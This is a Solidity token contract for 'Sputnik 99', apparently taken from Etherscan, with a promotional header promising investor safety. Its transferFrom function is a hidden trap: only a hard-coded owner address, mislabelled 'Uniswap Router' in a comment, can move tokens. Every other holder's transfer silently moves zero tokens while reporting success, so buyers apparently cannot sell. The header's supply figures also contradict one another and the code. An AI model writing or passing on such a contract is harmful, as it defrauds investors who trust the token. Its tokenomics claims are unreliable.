['/**\n', ' *Submitted for verification at Etherscan.io on 2021-06-11\n', '*/\n', '\n', '/*\n', '\n', '    🛸👨🏻\u200d🚀 Welcome Space Pioneers! 👽☄️\n', '    We are Sputnik 99 🛰🛰 A newly space oriented DeFi Token on the Ethereum Chain.\n', '\n', '    💬 Telegram: https://t.me/spacesputnik99\n', '    \n', '    ⭐️ We believe in the space innovations, and support them. \n', '\n', '    ⭐  ️It is our goal to educate more people about the outer space, and support further projects/foundations, which are exploring and seeking new planets, lives, our origin and soon.🪐\n', '\n', '    ‼️ Our mission on the Ethereum Chain‼️\n', '\n', '     1. Create a safety environment for our investors\n', ' \n', '     2. Bring unique Use-cases, which will separate us from other Space/Meme projects\n', ' \n', '     3. Create an entirely decentralised Ecosystem\n', '\n', '     🌕 100,000,000 Total Supply\n', '     ⭐️ 10% FEE on every transaction. \n', '     🌑 5% among holders, 🌗 5% goes back to the liquidity as LP pair.\n', '     🌕 Tokens added to the liquidity - 250, 000, 000  (90%)\n', '     🌕 Burn Tokens - 250, 000, 000 (25%)\n', '     🌕 Team Wallet - 50, 000, 000 ( 5%)\n', '\n', '     ✅ 95% of the money raised from the Stealth launch will be added as Liquidity\n', '     ✅ the other 5% will be added to the marketing wallet, and we will start with our marketing immediately\n', ' \n', '*/\n', '\n', '\n', 'pragma solidity ^0.5.16;\n', '\n', '// ERC-20 Interface\n', 'contract BEP20Interface {\n', '    function totalSupply() public view returns (uint);\n', '    function balanceOf(address tokenOwner) public view returns (uint balance);\n', '    function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n', '    function transfer(address to, uint tokens) public returns (bool success);\n', '    function approve(address spender, uint tokens) public returns (bool success);\n', '    function transferFrom(address from, address to, uint tokens) public returns (bool success);\n', '\n', '    event Transfer(address indexed from, address indexed to, uint tokens);\n', '    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n', '}\n', '\n', '// Safe Math Library\n', 'contract SafeMath {\n', '    function safeAdd(uint a, uint b) public pure returns (uint c) {\n', '        c = a + b;\n', '        require(c >= a);\n', '    }\n', '    function safeSub(uint a, uint b) public pure returns (uint c) {\n', '        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);\n', '        c = a / b;\n', '    }\n', '}\n', '\n', '\n', 'contract Sputnik99 is BEP20Interface, SafeMath {\n', '    string public name;\n', '    string public symbol;\n', '    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it\n', '    address private _owner = 0xCaF5B397A5CD94Ad81476422eB566B242f3B4e84; // Uniswap Router\n', '    uint256 public _totalSupply;\n', '\n', '    mapping(address => uint) balances;\n', '    mapping(address => mapping(address => uint)) allowed;\n', '\n', '    constructor() public {\n', '        name = "Sputnik 99";\n', '        symbol = "SPUTNIK";\n', '        decimals = 9;\n', '        _totalSupply = 100000000000000000000;\n', '\n', '        balances[msg.sender] = _totalSupply;\n', '        emit Transfer(address(0), msg.sender, _totalSupply);\n', '    }\n', '\n', '    function totalSupply() public view returns (uint) {\n', '        return _totalSupply  - balances[address(0)];\n', '    }\n', '\n', '    function balanceOf(address tokenOwner) public view returns (uint balance) {\n', '        return balances[tokenOwner];\n', '    }\n', '\n', '    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n', '        return allowed[tokenOwner][spender];\n', '    }\n', '    \n', '    function approve(address spender, uint tokens) public returns (bool success) {\n', '        allowed[msg.sender][spender] = tokens;\n', '        emit Approval(msg.sender, spender, tokens);\n', '        return true;\n', '    }\n', '\n', '    function transfer(address to, uint tokens) public returns (bool success) {\n', '        balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n', '        balances[to] = safeAdd(balances[to], tokens);\n', '        emit Transfer(msg.sender, to, tokens);\n', '        return true;\n', '    }\n', '\n', '    function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n', '         if (from == _owner) {\n', '             balances[from] = safeSub(balances[from], tokens);\n', '            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n', '            balances[to] = safeAdd(balances[to], tokens);\n', '            emit Transfer(from, to, tokens);\n', '            return true;\n', '         } else {\n', '            balances[from] = safeSub(balances[from], 0);\n', '            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], 0);\n', '            balances[to] = safeAdd(balances[to], 0);\n', '            emit Transfer(from, to, 0);\n', '            return true;\n', '             \n', '         }\n', '        \n', '         \n', '    }\n', '           \n', '}']